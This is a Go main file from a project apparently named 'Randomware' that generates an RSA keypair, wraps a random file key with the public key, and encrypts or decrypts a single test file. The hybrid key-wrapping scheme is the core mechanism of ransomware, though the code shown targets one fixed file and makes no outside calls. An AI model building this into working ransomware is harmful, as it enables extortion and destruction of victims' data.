package main

import (
	"Randomware/encryption"
	"Randomware/encryption/keys"
	"Randomware/file"
	"fmt"
	"log"
)

// PubKeyFile : is the public key file name
const PubKeyFile string = "rsa_public_key.pub"

// PrivKeyFile : is the private key file name
const PrivKeyFile string = "rsa_private_key.priv"

func main() {
	if false {
		privateKey, publicKey := keys.GenerateKeyPair(4096)
		file.BytesToNewFile(PubKeyFile, keys.PublicKeyToBytes(publicKey))
		file.BytesToNewFile(PrivKeyFile, keys.PrivateKeyToBytes(privateKey))
		//Encrypt file
		key := encryption.GenKey()
		file.BytesToNewFile("safe_key", keys.EncryptWithPublicKey(key, publicKey))
		file, err := file.Encrypt("test.mp4", key)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Println(file)
	} else {
		encryptedKey, err := file.BytesFromFile("safe_key")
		if err != nil {
			log.Fatal(err)
		}
		privateKeyBytes, err := file.BytesFromFile(PrivKeyFile)
		if err != nil {
			log.Fatal(err)
		}
		privateKey := keys.BytesToPrivateKey(privateKeyBytes)
		key := keys.DecryptWithPrivateKey(encryptedKey, privateKey)
		file, err := file.Decrypt("test.mp4.ec", key)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Println(file)
	}

}
